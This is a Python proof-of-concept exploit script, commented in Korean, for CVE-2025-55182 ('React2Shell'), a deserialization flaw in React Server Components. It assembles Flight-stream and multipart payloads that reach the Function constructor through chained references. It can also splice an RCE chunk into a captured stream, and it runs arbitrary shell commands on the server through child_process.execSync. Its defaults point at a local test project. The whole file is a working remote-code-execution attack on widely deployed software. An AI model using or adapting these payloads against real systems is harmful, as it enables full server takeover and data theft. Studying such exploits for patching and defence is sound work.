#!/usr/bin/env python3
"""
CVE-2025-55182 (React2Shell) PoC — RSC 역직렬화 RCE

React Flight 페이로드를 조립해 POST /api/rsc/render 로 전송합니다.
대상: 본 프로젝트 frontend-rsc (Vite + @vitejs/plugin-rsc 0.5.2, React 19.2.0)
      또는 동일 Flight 스트림을 받는 다른 RSC 서버.

사용 예:
  python cve-2025-55182-poc.py
  python cve-2025-55182-poc.py --url http://localhost:8888/api/rsc/render --code "console.log(1+1)"
  python cve-2025-55182-poc.py --code "require('child_process').execSync('id').toString()"
"""

import argparse
import json
import re
import sys
import urllib.request
import urllib.error
import uuid


def build_flight_payload(js_code: str) -> bytes:
    """
    lachlan2k 02-meow-rce-poc 스타일 Flight 페이로드 생성.
    _prefix 에 들어갈 JS 코드가 서버에서 Function(...) 으로 실행됨.
    CRLF(\\r\\n) 사용 — 일부 Flight 파서가 기대하는 형식.
    """
    # Blob id는 숫자 접미사 (예: $B3). value의 then에서 참조.
    # _prefix + id 가 Function 인자로 들어감 → 코드 끝에 "3" 같은 게 붙으므로 주석으로 무력화
    safe_code = js_code.rstrip()
    if not safe_code.endswith("//"):
        safe_code = safe_code + "//"

    chunk1_value = json.dumps({
        "then": "$4:map",
        "0": {"then": "$B3"},
        "length": 1,
    })

    chunk1 = {
        "status": "resolved_model",
        "reason": 0,
        "_response": "$5",
        "value": chunk1_value,
        "then": "$2:then",
    }

    chunk5 = {
        "_prefix": safe_code,
        "_formData": {"get": "$4:constructor:constructor"},
        "_chunks": "$2:_response:_chunks",
        "_bundlerConfig": {},
    }

    rows = [
        '0="$1"',
        "&1=" + json.dumps(chunk1, separators=(",", ":")),
        '&2="$@3"',
        '&3=""',
        "&4=[]",
        "&5=" + json.dumps(chunk5, separators=(",", ":")),
    ]
    # CRLF 라인 엔딩 + 마지막 줄바꿈 (일부 Flight 리더 기대)
    body = "\r\n".join(rows) + "\r\n"
    return body.encode("utf-8")


def build_multipart_payload(js_code: str):
    """
    lachlan2k 01-submitted-poc 와 동일한 multipart/form-data.
    필드 0,1,2,3,4 각각 JSON.stringify(value) 로 전송.
    """
    safe_code = js_code.rstrip()
    if not safe_code.endswith("//"):
        safe_code = safe_code + "//"

    payload = {
        "0": "$1",
        "1": {
            "status": "resolved_model",
            "reason": 0,
            "_response": "$4",
            "value": '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            "then": "$2:then",
        },
        "2": "$@3",
        "3": [],
        "4": {
            "_prefix": safe_code,
            "_formData": {"get": "$3:constructor:constructor"},
            "_chunks": "$2:_response:_chunks",
        },
    }
    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex[:16]
    lines = []
    for key in ("0", "1", "2", "3", "4"):
        value = payload[key]
        if isinstance(value, dict):
            value = json.dumps(value, separators=(",", ":"))
        else:
            value = json.dumps(value)
        lines.append(f"--{boundary}")
        lines.append(f'Content-Disposition: form-data; name="{key}"')
        lines.append("")
        lines.append(value)
    lines.append(f"--{boundary}--")
    lines.append("")
    body = "\r\n".join(lines).encode("utf-8")
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_rce_chunk_json(js_code: str) -> str:
    """RCE용 단일 청크 객체 JSON (스트림 내 한 행 치환용)."""
    safe_code = js_code.rstrip()
    if not safe_code.endswith("//"):
        safe_code = safe_code + "//"
    chunk = {
        "_prefix": safe_code,
        "_formData": {"get": "$4:constructor:constructor"},
        "_chunks": "$2:_response:_chunks",
        "_bundlerConfig": {},
    }
    return json.dumps(chunk, separators=(",", ":"))


def inject_rce_into_stream(stream_bytes: bytes, js_code: str):
    """
    실제 스트림에서 청크 정의 하나를 RCE 청크로 치환.
    - Vite RSC 형식: id:{...} 한 줄 (예: 2:{"name":"Root",...,"props":{}})
    - 또는 &N={...} / id:J{...} 등 다른 형식.
    """
    text = stream_bytes.decode("utf-8", errors="replace")
    sep = "\r\n" if "\r\n" in text else "\n"
    lines = text.split(sep)
    rce_json = build_rce_chunk_json(js_code)

    # 0) Vite RSC 한 줄 형식: id:{...} (예: 2:{"name":"Root","env":"Server",...,"props":{}})
    #    이 스트림에는 then/_response 가 없을 수 있으므로, id 뒤에 JSON 객체가 오는 행을 치환.
    for i, line in enumerate(lines):
        m = re.match(r"^(\d+):(\{.*\})$", line)
        if m:
            lines[i] = m.group(1) + ":" + rce_json
            return sep.join(lines).encode("utf-8"), True

    # 1) 줄 단위: 행이 &N={...} 형태이고 then/_response/_chunks 포함
    for i, line in enumerate(lines):
        m = re.match(r"^&(\d+)=\{(.*)$", line)
        if not m:
            # 한 줄 전체가 {...} 인 경우 (React 스트림에서 id:tag 다음 줄에 오는 경우)
            stripped = line.strip()
            if stripped.startswith("{") and stripped.endswith("}"):
                if "then" in stripped or "_response" in stripped or "_chunks" in stripped or "resolved_model" in stripped:
                    lines[i] = line[: line.index("{")] + rce_json + line[line.rindex("}") + 1 :]
                    return sep.join(lines).encode("utf-8"), True
            continue
        rest = m.group(2)
        if "then" in rest or "_response" in rest or "_chunks" in rest:
            lines[i] = "&" + m.group(1) + "=" + rce_json
            return sep.join(lines).encode("utf-8"), True

    # 2) 스트림 전체에서 &N={ ... } (한 블록) 찾기 — 줄바꿈 없거나 한 줄에 여러 개일 때
    def find_brace_end(s: str, start: int) -> int:
        depth = 0
        i = start
        while i < len(s):
            if s[i] == "{":
                depth += 1
            elif s[i] == "}":
                depth -= 1
                if depth == 0:
                    return i
            i += 1
        return -1

    # 2a) React Flight 형식: "id:tag" 다음에 오는 JSON (예: 1:J{...} 또는 2:E{...})
    #     id는 16진수, tag 한 글자 다음이 { 이면 JSON 블록으로 처리.
    for match in re.finditer(r"[0-9a-fA-F]+:[A-Za-z]\{", text):
        brace_start = match.end() - 1
        brace_end = find_brace_end(text, brace_start)
        if brace_end == -1:
            continue
        segment = text[brace_start : brace_end + 1]
        if "then" in segment or "_response" in segment or "resolved_model" in segment or "_chunks" in segment:
            new_text = text[: brace_start + 1] + rce_json + text[brace_end + 1 :]
            return new_text.encode("utf-8"), True

    pos = 0
    while True:
        match = re.search(r"&(\d+)=\{", text[pos:])
        if not match:
            break
        n = match.group(1)
        brace_start = pos + match.end() - 1
        brace_end = find_brace_end(text, brace_start)
        if brace_end == -1:
            pos = pos + match.end()
            continue
        segment = text[brace_start : brace_end + 1]
        if "then" in segment or "_response" in segment or "_chunks" in segment:
            new_text = text[: brace_start + 1] + rce_json + text[brace_end + 1 :]
            return new_text.encode("utf-8"), True
        pos = brace_end + 1

    return stream_bytes, False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="CVE-2025-55182 React2Shell PoC — RSC 역직렬화 RCE"
    )
    parser.add_argument(
        "--url",
        default="http://localhost:8888/api/rsc/render",
        help="대상 URL (기본: 메인 앱 RSC API)",
    )
    parser.add_argument(
        "--code",
        default="console.log('CVE-2025-55182-PoC')//",
        help="서버에서 실행할 JS 코드 한 줄 (기본: 무해한 console.log)",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="요청 없이 페이로드만 출력",
    )
    parser.add_argument(
        "--multipart",
        action="store_true",
        help="Next.js 형식 multipart/form-data로 전송 (decodeReply 경로 사용)",
    )
    parser.add_argument(
        "--fetch-payload",
        action="store_true",
        help="RSC 서버에서 실제 스트림을 GET 한 뒤 그대로 POST (파이프라인 검증용)",
    )
    parser.add_argument(
        "--fetch-url",
        default="http://localhost:5174/?rsc",
        help="--fetch-payload 시 GET 할 URL (기본: RSC 스트림)",
    )
    parser.add_argument(
        "--rce",
        action="store_true",
        help="실제 스트림 + RCE 페이로드(ls 실행) 전송. 결과는 frontend-rsc 로그에서 확인.",
    )
    parser.add_argument(
        "--analyze",
        action="store_true",
        help="실제 스트림을 가져와 형식(행 단위) 출력. RCE 주입 시 참고.",
    )
    parser.add_argument(
        "--save-stream",
        metavar="FILE",
        help="실제 스트림을 GET 해서 파일로 저장 (예: payload.bin).",
    )
    parser.add_argument(
        "--rce-inject",
        action="store_true",
        help="실제 스트림 안에 RCE 청크를 주입해 POST. 이 프로젝트에서 RCE 시연 시 --replay 와 함께 사용.",
    )
    parser.add_argument(
        "--replay",
        action="store_true",
        help="RSC 재생 API(/api/rsc/replay)로 전송. --rce-inject 와 함께 사용 시 이 프로젝트에서 RCE 결과 확인 가능.",
    )
    parser.add_argument(
        "--rce-cmd",
        default="ls",
        metavar="CMD",
        help="RCE로 실행할 셸 명령 (기본: ls). 예: --rce-cmd id, --rce-cmd \"whoami\"",
    )
    args = parser.parse_args()

    if getattr(args, "replay", False):
        args.url = args.url.replace("/render", "/replay")

    if args.analyze:
        try:
            with urllib.request.urlopen(
                urllib.request.Request(args.fetch_url, method="GET"),
                timeout=10,
            ) as r:
                raw = r.read()
        except urllib.error.URLError as e:
            print(f"Fetch URL Error: {e.reason}")
            sys.exit(1)
        if len(raw) == 0:
            print("Error: stream is empty.")
            sys.exit(1)
        print(f"Stream length: {len(raw)} bytes")
        print("First 300 bytes (hex):")
        print(raw[:300].hex())
        print("\nAs text (repr, first 500):")
        print(repr(raw[:500]))
        print("\nLines (split by \\n then \\r\\n):")
        text = raw.decode("utf-8", errors="replace")
        for line in text.replace("\r\n", "\n").split("\n"):
            if line.strip():
                print(f"  | {line[:120]}{'...' if len(line) > 120 else ''}")
        sys.exit(0)

    if args.save_stream:
        try:
            with urllib.request.urlopen(
                urllib.request.Request(args.fetch_url, method="GET"),
                timeout=10,
            ) as r:
                raw = r.read()
        except urllib.error.URLError as e:
            print(f"Fetch URL Error: {e.reason}")
            sys.exit(1)
        with open(args.save_stream, "wb") as f:
            f.write(raw)
        print(f"Saved {len(raw)} bytes to {args.save_stream}")
        sys.exit(0)

    if args.rce_inject:
        try:
            with urllib.request.urlopen(
                urllib.request.Request(args.fetch_url, method="GET"),
                timeout=10,
            ) as r:
                real_stream = r.read()
        except urllib.error.URLError as e:
            print(f"Fetch URL Error: {e.reason}")
            sys.exit(1)
        if len(real_stream) == 0:
            print("Error: stream is empty.")
            sys.exit(1)
        cmd = getattr(args, "rce_cmd", "ls")
        safe_cmd = cmd.replace("\\", "\\\\").replace("'", "\\'")
        rce_code = f"var x=require('child_process').execSync('{safe_cmd}').toString();throw new Error(x);//"
        payload, injected = inject_rce_into_stream(real_stream, rce_code)
        if not injected:
            print("Could not find a chunk row to replace (format may differ). Try --analyze to inspect stream.")
            sys.exit(1)
        print(f"Injected RCE chunk into stream ({len(payload)} bytes), sending to {args.url}")
        headers = {
            "Content-Type": "text/x-component; charset=utf-8",
            "User-Agent": "CVE-2025-55182-PoC",
        }
    elif args.rce:
        # 실제 스트림 가져온 뒤 RCE 페이로드(execSync('ls')) 붙여서 전송
        try:
            with urllib.request.urlopen(
                urllib.request.Request(args.fetch_url, method="GET"),
                timeout=10,
            ) as r:
                real_stream = r.read()
            if len(real_stream) == 0:
                print("Error: fetched stream is empty. Is RSC server running at", args.fetch_url)
                sys.exit(1)
            cmd = getattr(args, "rce_cmd", "ls")
            safe_cmd = cmd.replace("\\", "\\\\").replace("'", "\\'")
            rce_code = f"var x=require('child_process').execSync('{safe_cmd}').toString();throw new Error(x);//"
            rce_payload = build_flight_payload(rce_code)
            payload = real_stream + b"\r\n" + rce_payload
            print(f"Fetched {len(real_stream)} bytes, appending RCE payload ({len(rce_payload)} bytes)")
            print("RCE code: ls 실행 후 결과를 HTTP 응답(500)으로 받음")
            print("(이 스택에서는 뒤에 붙인 페이로드가 처리되지 않으면 200이 옵니다. RCE 재현은 Next.js 등에서.)")
            headers = {
                "Content-Type": "text/x-component; charset=utf-8",
                "User-Agent": "CVE-2025-55182-PoC",
            }
        except urllib.error.URLError as e:
            print(f"Fetch URL Error: {e.reason}")
            sys.exit(1)
    elif args.fetch_payload:
        try:
            with urllib.request.urlopen(
                urllib.request.Request(args.fetch_url, method="GET"),
                timeout=10,
            ) as r:
                payload = r.read()
            if len(payload) == 0:
                print("Error: fetched payload is empty. Is RSC server running at", args.fetch_url)
                sys.exit(1)
            print(f"Fetched {len(payload)} bytes from {args.fetch_url}")
            headers = {
                "Content-Type": "text/x-component; charset=utf-8",
                "User-Agent": "CVE-2025-55182-PoC",
            }
        except urllib.error.URLError as e:
            print(f"Fetch URL Error: {e.reason}")
            sys.exit(1)
    elif args.multipart:
        payload, content_type = build_multipart_payload(args.code)
        headers = {"Content-Type": content_type, "User-Agent": "CVE-2025-55182-PoC"}
    else:
        payload = build_flight_payload(args.code)
        headers = {
            "Content-Type": "text/x-component; charset=utf-8",
            "User-Agent": "CVE-2025-55182-PoC",
        }

    if args.dry_run:
        print("Payload (first 500 bytes):")
        print(payload[:500].decode("utf-8", errors="replace"))
        if len(payload) > 500:
            print("...")
        sys.exit(0)

    req = urllib.request.Request(
        args.url,
        data=payload,
        method="POST",
        headers=headers,
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            print(f"Status: {resp.status}")
            print(f"Response: {body}")
            if resp.status == 200 and ("ok" in body.lower() or "deserialized" in body.lower()):
                print("\n[+] 역직렬화 성공. 서버 로그에서 코드 실행 여부 확인.")
                if getattr(args, "rce", False):
                    print("    (RCE가 동작하면 500 응답 본문에 ls 결과가 옵니다. 200이면 이 환경에서는 RCE 미동작.)")
                if getattr(args, "rce_inject", False):
                    print("    (RCE 주입이 파서에 의해 실행되면 500+본문에 ls 결과가 옵니다.)")
    except urllib.error.HTTPError as e:
        body = e.fp.read().decode("utf-8", errors="replace") if e.fp else ""
        print(f"HTTP {e.code}: {e.reason}")
        print(body)
        if (getattr(args, "rce", False) or getattr(args, "rce_inject", False)) and e.code == 500 and body:
            try:
                data = json.loads(body)
                err = data.get("error") if isinstance(data.get("error"), str) else ""
                if err:
                    # 파서/런타임 오류는 RCE 출력이 아님
                    if "enqueueModel" in err or "is not a function" in err or "Cannot read" in err or "undefined" in err:
                        print("\n[!] 파서 오류 (청크 형식 불일치). RCE는 트리거되지 않았습니다.")
                        print("    이 환경(Vite RSC)에서는 청크 구조가 다릅니다. Next.js 등에서 --multipart 로 RCE 재현 가능.")
                    else:
                        print("\n[+] RCE 출력 (응답 본문에 실림):")
                        print("-" * 40)
                        print(err)
                        print("-" * 40)
            except (json.JSONDecodeError, KeyError):
                pass
        sys.exit(1)
    except urllib.error.URLError as e:
        print(f"URL Error: {e.reason}")
        sys.exit(1)


if __name__ == "__main__":
    main()
